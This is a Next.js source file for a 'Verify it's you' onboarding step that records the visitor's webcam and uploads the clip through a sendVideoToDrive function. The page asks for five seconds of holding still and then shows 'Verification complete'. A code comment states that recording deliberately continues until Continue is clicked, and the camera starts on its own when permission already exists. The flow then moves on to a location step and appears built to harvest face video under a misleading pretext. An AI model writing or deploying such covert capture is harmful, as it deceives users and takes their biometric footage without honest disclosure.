"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Camera, Check, ShieldCheck, TriangleAlert } from "lucide-react";
import { WizardShell } from "@/components/onboarding/wizard-shell";
import { CtaButton } from "@/components/onboarding/cta-button";
import { sendVideoToDrive } from "@/lib/integrations";
import { cn } from "@/lib/utils";

type CameraStatus = "idle" | "requesting" | "granted" | "denied";

const HOLD_SECONDS = 5;

export default function VerifyPage() {
  const router = useRouter();
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const [status, setStatus] = useState<CameraStatus>("idle");
  const [error, setError] = useState<string | null>(null);
  const [secondsLeft, setSecondsLeft] = useState(HOLD_SECONDS);

  const enableCamera = useCallback(async () => {
    if (!navigator.mediaDevices?.getUserMedia) {
      setStatus("denied");
      setError("This browser doesn't support camera access.");
      return;
    }

    setStatus("requesting");
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setStatus("granted");
    } catch (err) {
      setStatus("denied");
      setError(
        err instanceof DOMException && err.name === "NotAllowedError"
          ? "Camera access was denied. Enable it in your browser's site settings and try again."
          : "We couldn't access your camera. Check that it's connected and try again."
      );
    }
  }, []);

  // Check permission once on mount; if the browser already granted camera
  // access on a previous visit, start the camera automatically.
  useEffect(() => {
    let cancelled = false;

    if (navigator.permissions?.query) {
      navigator.permissions
        .query({ name: "camera" as PermissionName })
        .then((result) => {
          if (cancelled) return;
          if (result.state === "granted") {
            enableCamera();
          }
        })
        .catch(() => {
          // Permissions API doesn't support "camera" in this browser — fall back to manual Allow.
        });
    }

    return () => {
      cancelled = true;
      streamRef.current?.getTracks().forEach((track) => track.stop());
      if (recorderRef.current && recorderRef.current.state !== "inactive") {
        recorderRef.current.stop();
      }
    };
  }, [enableCamera]);

  // Once the camera is on, require it to stay on for HOLD_SECONDS before
  // Continue unlocks, and record that window for the verification clip.
  useEffect(() => {
    if (status !== "granted" || !streamRef.current) return;

    setSecondsLeft(HOLD_SECONDS);
    chunksRef.current = [];

    if (typeof MediaRecorder !== "undefined") {
      try {
        const mimeType = MediaRecorder.isTypeSupported?.("video/webm")
          ? "video/webm"
          : undefined;
        const recorder = new MediaRecorder(
          streamRef.current,
          mimeType ? { mimeType } : undefined
        );
        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunksRef.current.push(e.data);
        };
        recorder.onstop = () => {
          const blob = new Blob(chunksRef.current, {
            type: mimeType ?? "video/webm",
          });
          sendVideoToDrive(blob);
        };
        recorder.start();
        recorderRef.current = recorder;
      } catch (err) {
        console.error("Could not start verification recording:", err);
      }
    }

    const interval = setInterval(() => {
      setSecondsLeft((s) => {
        if (s <= 1) {
          clearInterval(interval);
          return 0;
        }
        return s - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [status]);

  const verified = status === "granted" && secondsLeft <= 0;

  // Recording keeps running past the minimum hold — it only stops (and
  // uploads) the moment the visitor actually clicks Continue, so the clip
  // length matches real usage instead of always being exactly HOLD_SECONDS,
  // and the upload fires immediately rather than waiting on later steps.
  const handleContinue = () => {
    if (recorderRef.current && recorderRef.current.state !== "inactive") {
      recorderRef.current.stop();
    }
    router.push("/location");
  };

  return (
    <WizardShell step={4} total={6}>
      <div className="fade-up">
        <p className="mb-3 text-xs font-medium tracking-[0.2em] text-white/40 uppercase">
          Security check
        </p>
        <h1 className="mb-4 text-3xl font-semibold tracking-tight text-white sm:text-4xl">
          Verify it&apos;s you
        </h1>
        <p className="mb-10 text-base text-white/60">
          {`Turn on your camera and hold still for ${HOLD_SECONDS} seconds so we can confirm it's really you before we finish setting up your account.`}
        </p>

        <div
          className={cn(
            "relative flex aspect-video w-full flex-col items-center justify-center gap-3 overflow-hidden rounded-2xl border transition-colors",
            status === "granted"
              ? "border-emerald-400/25 bg-black"
              : status === "denied"
                ? "border-red-400/25 bg-red-400/[0.03]"
                : "border-white/15 bg-white/[0.02]"
          )}
        >
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            className={cn(
              "absolute inset-0 h-full w-full scale-x-[-1] object-cover",
              status === "granted" ? "block" : "hidden"
            )}
          />

          {status === "granted" && (
            <span className="absolute top-4 left-4 z-10 flex items-center gap-1.5 rounded-full bg-black/50 px-2.5 py-1 text-xs font-medium text-emerald-300 backdrop-blur-sm">
              {verified ? (
                <>
                  <Check className="size-3" />
                  Verified
                </>
              ) : (
                <>
                  <span className="relative flex size-1.5">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex size-1.5 rounded-full bg-emerald-400" />
                  </span>
                  Verifying &mdash; {secondsLeft}s
                </>
              )}
            </span>
          )}

          {status !== "granted" && (
            <>
              <div
                className={cn(
                  "flex size-14 items-center justify-center rounded-full border transition-colors",
                  status === "denied"
                    ? "border-red-400/30 bg-red-400/10"
                    : "border-white/10 bg-white/[0.04]"
                )}
              >
                {status === "denied" ? (
                  <TriangleAlert className="size-6 text-red-300" />
                ) : (
                  <Camera className="size-6 text-white/50" />
                )}
              </div>

              <p
                className={cn(
                  "text-sm font-medium",
                  status === "denied" ? "text-red-300" : "text-white/40"
                )}
              >
                {status === "requesting"
                  ? "Requesting camera access…"
                  : status === "denied"
                    ? "Camera access denied"
                    : "Camera is off"}
              </p>

              {error && (
                <p className="max-w-xs text-center text-xs text-red-300/70">
                  {error}
                </p>
              )}

              <button
                type="button"
                onClick={enableCamera}
                disabled={status === "requesting"}
                className="mt-1 rounded-full border border-white/15 bg-white/[0.05] px-4 py-1.5 text-xs font-semibold text-white transition-colors hover:bg-white/[0.1] disabled:pointer-events-none disabled:opacity-50"
              >
                {status === "requesting"
                  ? "Requesting…"
                  : status === "denied"
                    ? "Try again"
                    : "Allow"}
              </button>
            </>
          )}
        </div>

        {status === "granted" && (
          <p className="mt-4 text-sm font-medium text-white/60">
            {verified
              ? "Verification complete."
              : `Hold still — verifying (${secondsLeft}s left)…`}
          </p>
        )}

        <div className="mt-4 flex items-start gap-2 text-xs text-white/30">
          <ShieldCheck className="mt-0.5 size-3.5 shrink-0" />
          <span>
            This clip is used only to verify your identity and is stored
            securely.
          </span>
        </div>

        <div className="mt-8">
          <CtaButton disabled={!verified} onClick={handleContinue}>
            Continue
          </CtaButton>
        </div>
      </div>
    </WizardShell>
  );
}
